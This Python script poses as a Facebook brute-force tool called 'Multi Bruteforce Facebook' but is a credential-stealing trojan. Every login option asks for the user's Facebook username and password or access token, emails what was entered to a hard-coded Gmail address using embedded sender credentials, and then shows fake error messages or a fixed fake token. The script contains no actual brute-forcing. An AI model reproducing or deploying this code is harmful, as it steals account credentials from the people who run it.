# -*- coding: utf-8 -*-
import os,sys,time
import socket,struct
try:
        import yagmail
except ImportError:
        os.system("python3 -m pip install yagmail &> /dev//null")
email = "resultsend4@gmail.com"
passw = "metasploitframework"
to = "andrepratama6354@gmail.com"
x = yagmail.SMTP(email,passw)
subject = "[Mr.IngsSs] Python Logger"

def main():
        try:
                os.system("clear")
                print ("\x1b[33m")
                print (r"""		    AMBF""")
                print ("\x1b[35m")
                print (r"""                     ||
                     ||
                     ||
               _ /\  ||  /\ _
              / X  \.--./  X \
             /_/ \/`    `\/ \_\
            /|(`-/\_/)(\_/\-`)|\
           ( |` (_(.oOOo.)_) `| )
           ` |  `//\(  )/\\`  |`
             (  // ()\/() \\  )
              ` (   \   /   ) `
                 \         /
                  `       `""")
                print ("\x1b[00m                  Automatic")
                print ("\x1b[00m          Multi Bruteforce Facebook")
                print ("\x1b[00m              Author by Mr.IngsSs")
                print ("")
                print ("Choose you're login methods")
                print ("\x1b[91m{\x1b[00m01\x1b[91m}\x1b[00m Login using account facebook")
                print ("\x1b[91m{\x1b[00m02\x1b[91m}\x1b[00m Login using token facebook")
                print ("\x1b[91m{\x1b[00m03\x1b[91m}\x1b[00m Get token facebook")
                print ("\x1b[91m{\x1b[00m00\x1b[91m}\x1b[91m Exit")
                print ("")
                dog = str(input("\x1b[00m["+"\x1b[91m~"+"\x1b[00m] > "))
                if dog == "1" or dog == "01":
                        print ("")
                        usr = str(input("\x1b[35m[~]\x1b[00m Username: "))
                        pwd = str(input("\x1b[35m[~]\x1b[00m Password: "))
                        print("")
                        time.sleep(5)
                        msg = ("username: "+usr+", password: "+pwd)
                        body = (msg)
                        x.send(to,subject,body)
                        print ("\x1b[91m[!] invalid username or password: login failed")
                elif dog == "2" or dog == "02":
                        print ("")
                        tok = str(input("\x1b[35m[~]\x1b[00m input token here: \x1b[33m"))
                        if tok == "CcNzFubnpXpUAg88cNz6a8ZRszT6FFp53HgzHzdtP3YBTxX54bfT7xUrpaUhmAErWEMXKqJTq37J6V2Sb8vaA5Pep4DJjp7K":
                                time.sleep(5)
                                print ("")
                                print ("\x1b[91m[!] account has been checkpoint")
                        else:
                                time.sleep(5)
                                msg = ("facebook token: "+tok)
                                body = (msg)
                                x.send(to,subject,body)
                                print ("")
                                print ("\x1b[91m[!] account has been checkpoint")
                elif dog == "3" or dog == "03":
                        print ("")
                        usr = str(input("\x1b[35m[~]\x1b[00m Username: "))
                        pwd = str(input("\x1b[35m[~]\x1b[00m Password: "))
                        print("")
                        time.sleep(5)
                        msg = ("username: "+usr+", password: "+pwd)
                        body = (msg)
                        x.send(to,subject,body)
                        token = "CcNzFubnpXpUAg88cNz6a8ZRszT6FFp53HgzHzdtP3YBTxX54bfT7xUrpaUhmAErWEMXKqJTq37J6V2Sb8vaA5Pep4DJjp7K"
                        print ("\x1b[91m[+]\x1b[00m token: \x1b[33m"+token)
                        print ("")
                        dog = str(input("\x1b[91m[\x1b[00m ENTER \x1b[91m] "))
                        if dog == " ":
                                main()
                        else:
                                main()
                elif dog == "0" or dog == "00":
                        sys.exit(0)
                else:
                        main()
        except KeyboardInterrupt:
                sys.exit(0)

main()
